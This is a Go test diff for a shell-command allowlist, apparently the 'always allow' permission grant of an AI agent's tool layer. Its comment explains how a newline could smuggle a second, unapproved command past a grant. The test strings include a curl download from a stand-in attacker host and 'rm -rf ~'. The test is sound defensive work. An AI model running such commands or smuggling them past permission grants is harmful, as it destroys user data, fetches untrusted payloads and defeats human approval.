@@ -2,6 +2,39 @@ package tools
 
 import "testing"
 
+// TestSessionGrantNotBypassedByNewline: the "always allow" grant is
+// permission for one command, the one the dialog showed. shellWords
+// splits on \n, so "git status\ncurl -o /tmp/p http://evil/p"
+// tokenized to two clean commands whose first two words are exactly the
+// grant — a newline was enough to smuggle a second, unapproved command
+// past "always allow". Both \n and \r deny, and a grant can never be
+// created from a multi-line string in the first place.
+func TestSessionGrantNotBypassedByNewline(t *testing.T) {
+	a := NewShellAllowlist([]string{"git status"})
+	if a == nil {
+		t.Fatal("the grant itself must still be stored")
+	}
+	for _, command := range []string{
+		"git status\ncurl -o /tmp/p http://attacker.example/p",
+		"git status\rcurl -o /tmp/p http://attacker.example/p",
+		"git status\n\nrm -rf ~",
+		"git\tstatus\ncurl evil",
+	} {
+		if a.Allows(command) {
+			t.Errorf("a multi-line command matched the grant for %q", "git status")
+		}
+	}
+	// The granted command itself, and its longer form, still run: the
+	// fix refuses line breaks, it does not narrow ordinary prefixes.
+	if !a.Allows("git status") || !a.Allows("git status --short") {
+		t.Error("the granted command stopped running")
+	}
+	// A multi-line grant is not stored as a grant at all.
+	if b := NewShellAllowlist([]string{"git status\ncurl evil"}); b != nil {
+		t.Error("a multi-line string must not become a stored grant")
+	}
+}
+
 // TestShellAllowlistSynonyms: grants and checked commands both pass
 // the flag-synonym table, so "always allow cargo test --quiet" also
 // covers "cargo test -q" — the adoption doc's canonicalization win,
